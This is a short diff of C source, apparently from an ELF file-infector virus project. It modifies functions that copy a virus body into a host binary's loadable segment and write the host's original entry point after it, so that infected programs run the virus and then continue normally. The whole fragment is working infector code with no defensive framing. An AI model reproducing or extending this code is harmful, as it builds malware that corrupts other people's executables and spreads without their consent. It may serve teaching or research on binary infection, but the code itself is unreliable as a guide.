@@ -11,18 +11,14 @@ int			get_size_needed(t_elf *elf, t_elf *virus_elf)
 	return (diff);
 }
 
-void	add_injection(void **dst, t_elf *elf)
+void	add_injection(void **dst, t_elf *elf, uint64_t offset_inject)
 {
-	uint64_t		offset_inject;
-	uint64_t		entry;
 
 	memcpy(*dst, INJECT, INJECT_SIZE - (sizeof(uint64_t) * 3));
 	*dst += INJECT_SIZE - (sizeof(uint64_t) * 3);
 	memcpy(*dst + sizeof(uint64_t) * 0, &elf->pt_load->p_vaddr, sizeof(uint64_t));
-	offset_inject = 0;
 	memcpy(*dst + sizeof(uint64_t) * 1, &offset_inject, sizeof(uint64_t));
-	entry = 0;
-	memcpy(*dst + sizeof(uint64_t) * 2, &entry, sizeof(uint64_t));
+	memcpy(*dst + sizeof(uint64_t) * 2, &elf->header->e_entry, sizeof(uint64_t));
 	*dst += sizeof(uint64_t) * 3;
 }
 
@@ -48,7 +44,7 @@ void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 	src += pt_load_size_left;
 	memcpy(dst, virus_elf->addr, virus_elf->size);
 	dst += virus_elf->size;
-	add_injection(&dst, elf);
+	add_injection(&dst, elf, new_entry);
 	memset(dst, 0, nb_zero);
 	dst += nb_zero;
 	// TODO: fix for thin files like inject
